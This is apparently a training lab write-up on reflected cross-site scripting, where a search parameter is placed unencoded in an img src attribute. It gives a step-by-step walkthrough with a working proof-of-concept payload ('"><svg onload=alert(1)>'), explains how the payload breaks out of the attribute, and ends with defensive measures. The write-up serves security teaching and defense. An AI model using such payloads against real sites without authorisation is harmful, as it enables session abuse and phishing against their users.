# Reflected Cross-Site Scripting (XSS) — Breaking Out of an `img` Attribute

## 1. Vulnerability

**Vulnerability:** Reflected Cross-Site Scripting (Reflected XSS)

**Severity:** Medium

**Injection Context:** HTML attribute (`img src`)

**Payload:**

```html
"><svg onload=alert(1)>
```

### Description

The application takes user-controlled input from the search parameter and places it directly inside an `img` element's `src`attribute without properly encoding the input.

Because the input is inserted into an HTML attribute context, an attacker can use a quotation mark (`"`) to terminate the existing `src` attribute and then inject a new HTML element containing JavaScript execution through an event handler.

---

# 2. Objective

The objective of this lab is to:

- Identify where user-controlled input is inserted into the HTML page.
- Determine the HTML context in which the input is reflected.
- Break out of an existing HTML attribute.
- Inject a new HTML element.
- Trigger JavaScript execution using an SVG `onload` event.
- Understand how context-specific output encoding prevents this vulnerability.

---

# 3. Step-by-Step Exploitation

## Step 1 — Enter a Random String

Enter a random alphanumeric string into the search box.

For example:

```
test123
```

Click:

**Search**

The purpose of this step is to determine **where the application's output is placed in the HTML source**.

---

# 4. Step 2 — Inspect the HTML

Right-click the page and select:

**Inspect**

Alternatively, open Developer Tools using the browser's developer tools shortcut.

Search the HTML for the random string you submitted.

You may observe something similar to:

```html
<img src="test123">
```

This is an important discovery.

It shows that the supplied input is being inserted directly inside the `src` attribute of an `<img>` element.

Therefore, the current context is:

```
HTML attribute context
        ↓
<img src="USER_INPUT">
```

---

# 5. Step 3 — Identify the Injection Point

The application effectively produces:

```html
<img src="YOUR_INPUT">
```

If the input is:

```
test123
```

the resulting HTML becomes:

```html
<img src="test123">
```

The goal is therefore to escape from the `src` attribute.

---

# 6. Step 4 — Break Out of the Attribute

Use the following payload:

```html
"><svg onload=alert(1)>
```

Enter it into the search box and submit the search.

---

# 7. Step 5 — Understand the Payload

The payload consists of several parts:

```html
"><svg onload=alert(1)>
```

### `"`

The double quote terminates the existing `src` attribute.

The original HTML:

```html
<img src="USER_INPUT">
```

becomes conceptually:

```html
<img src="">
```

after the injected quote closes the attribute.

---

### `>`

The `>` closes the `<img>` tag.

This allows the attacker to start injecting additional HTML.

---

### `<svg>`

The attacker introduces a new SVG element.

The resulting structure is conceptually similar to:

```html
<img src=""><svg onload=alert(1)>
```

---

### `onload=alert(1)`

The SVG element has an `onload` event handler.

When the SVG element is loaded by the browser, the event handler executes:

```jsx
alert(1)
```

---

# 8. Payload Execution Flow

The attack can be visualized as:

```
User Input
    │
    ▼
"><svg onload=alert(1)>
    │
    ▼
Break out of src attribute
    │
    ▼
Close the original IMG element
    │
    ▼
Inject SVG element
    │
    ▼
SVG loads
    │
    ▼
onload event fires
    │
    ▼
alert(1) executes
```

---

# 9. Step 6 — Confirm the Vulnerability

After submitting the payload:

```html
"><svg onload=alert(1)>
```

the browser should display a JavaScript alert containing:

```
1
```

Example:

```
+----------------------+
|          1           |
|                      |
|        [ OK ]        |
+----------------------+
```

The alert confirms that attacker-controlled JavaScript was executed in the browser.

---

# 10. What Happened Internally?

The application originally generates something similar to:

```html
<img src="USER_INPUT">
```

With a normal input:

```
test123
```

the browser receives:

```html
<img src="test123">
```

After supplying:

```html
"><svg onload=alert(1)>
```

the resulting HTML can become conceptually:

```html
<img src=""><svg onload=alert(1)>
```

The injected quotation mark escapes the original attribute, while the SVG element introduces an executable event handler.

---

# 11. Why the Vulnerability Exists

The root cause is **improper handling of untrusted data in an HTML attribute context**.

The application should treat the user's search input as data.

Instead, it inserts the input directly into HTML:

```html
<img src="USER_INPUT">
```

Without proper attribute encoding, characters such as:

```
"
<
>
```

can change the structure of the HTML document.

---

# 12. Impact

Depending on the application's functionality and the victim's privileges, Reflected XSS may allow an attacker to:

- Execute JavaScript in a victim's browser.
- Modify webpage content.
- Perform actions using the victim's authenticated session.
- Conduct phishing attacks within the trusted application.
- Access information exposed to JavaScript.
- Target privileged users such as administrators.

The actual impact depends on the application's architecture and available security controls.

---

# 13. Defensive Measures

## 13.1 Context-Aware Output Encoding

Because the input is placed inside an HTML attribute, the application should apply **HTML attribute encoding**.

For example, characters such as:

```
"
'
<
>
&
```

must be appropriately encoded when inserted into an HTML attribute.

The exact encoding strategy should match the output context.

---

## 13.2 Avoid Direct HTML Construction

Avoid constructing HTML by concatenating untrusted input.

Unsafe pattern:

```jsx
element.innerHTML = '<img src="' + userInput + '">';
```

Prefer safe DOM APIs where possible.

For example:

```jsx
const img = document.createElement('img');
img.src = userInput;
```

Even with safer APIs, developers should validate that the supplied value is appropriate for the intended URL/resource context.

---

## 13.3 Validate Input

Where appropriate, validate the expected format of the input.

For example, if a value is expected to contain only a specific set of characters, reject unexpected characters rather than allowing arbitrary HTML syntax.

Input validation should complement—not replace—proper output encoding.

---

## 13.4 Content Security Policy

Implement a strong **Content Security Policy (CSP)** as an additional layer of defense.

For example:

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

CSP should be treated as defense in depth and should not replace correct output encoding.

---

## 13.5 Avoid Inline Event Handlers

Avoid inline JavaScript event handlers such as:

```html
onload=
onclick=
onerror=
```

Use JavaScript event listeners instead.

---

# 14. Remediation Summary

| Issue | Recommended Defense |
| --- | --- |
| User input inserted into HTML attribute | Context-aware attribute encoding |
| Untrusted HTML interpreted by browser | Encode output before rendering |
| Dynamic HTML construction | Use safe DOM APIs |
| Unexpected input characters | Appropriate input validation |
| Inline event handlers | Avoid inline JavaScript |
| Defense in depth | Implement CSP |

---

# 15. Key Takeaway

This lab demonstrates an important XSS concept:

> **The exploitation technique depends on the context in which the input is inserted.**
> 

Here, the input is placed inside an `img` `src` attribute:

```html
<img src="USER_INPUT">
```

Therefore, the attacker's objective is first to **escape the attribute context** and then introduce executable HTML:

```html
"><svg onload=alert(1)>
```

The complete attack chain is:

```
User Input
     ↓
HTML Attribute Context
     ↓
"  → Escape Attribute
     ↓
>  → Close IMG Tag
     ↓
<svg>  → Inject HTML Element
     ↓
onload  → Trigger Event
     ↓
alert(1)
     ↓
JavaScript Execution
```

---

# 16. Evidence

**Test input:**

```
test123
```

**Observed HTML context:**

```html
<img src="test123">
```

**XSS payload:**

```html
"><svg onload=alert(1)>
```

**Expected result:**

```
JavaScript alert displaying: 1
```

**Vulnerability confirmed:** Yes — successful execution of `alert(1)` demonstrates Reflected XSS.
